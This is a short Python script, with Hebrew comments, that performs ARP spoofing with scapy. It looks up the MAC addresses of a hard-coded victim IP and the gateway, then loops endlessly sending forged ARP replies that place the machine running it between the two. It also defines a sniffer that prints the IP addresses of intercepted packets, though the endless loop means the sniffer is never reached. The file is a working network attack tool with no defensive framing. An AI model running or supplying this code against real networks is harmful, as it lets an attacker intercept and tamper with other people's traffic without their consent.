import scapy.all as scapy
from scapy.all import sniff

def spoof(target_ip, target_mac, victim_ip):
    spoofed_arp_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=victim_ip)
    scapy.send(spoofed_arp_packet)

def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply = scapy.srp(arp_request, timeout=2, verbose=False)[0]  # קבלת התשובה
    if reply:
        return reply[0][1].src  # החזרת כתובת ה-MAC
    return None

def wait_till_mac_found(ip):
    mac = None   
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print(f"MAC address for {ip} not found\n")
    return mac

def packet_callback(packet):
    if packet.haslayer(scapy.IP):
        ip_src = packet[scapy.IP].src
        ip_dst = packet[scapy.IP].dst
        print(f"Packet: {ip_src} -> {ip_dst}")
    
def start_sniffer(interface):
    print(f"Sniffing on {interface}...")
    sniff(iface=interface, prn=packet_callback, store=0)

# ---------------------------------------
gateway_ip = "10.99.203.254"  # כתובת ה-IP של הנתב
target_ip = "10.99.201.131"  # כתובת ה-IP של הקורבן

target_mac = wait_till_mac_found(target_ip)
gateway_mac = wait_till_mac_found(gateway_ip)

interface = "eth0"  
while True:
    spoof(target_ip, target_mac, gateway_ip)
    spoof(gateway_ip, gateway_mac, target_ip)
    print("Spoofing is active")

start_sniffer(interface)